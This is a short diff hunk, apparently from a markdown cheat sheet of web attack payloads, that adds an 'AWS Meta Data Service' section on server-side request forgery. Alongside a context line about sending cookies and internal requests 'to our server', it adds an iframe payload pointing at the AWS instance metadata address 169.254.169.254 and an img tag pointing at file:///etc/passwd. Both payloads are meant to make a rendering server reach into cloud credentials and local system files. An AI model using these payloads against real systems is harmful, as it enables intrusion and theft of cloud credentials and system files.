@@ -15,3 +15,8 @@ it will send cookies, internal requests, IP. To our server.
 
 SVG  `https://github.com/allanlw/svg-cheatsheet`
 
+#####  AWS Meta Data Service 
+SSRF -> AWS Metadata Service
+https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
+`<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>`
+`<img src="file:///etc/passwd">`
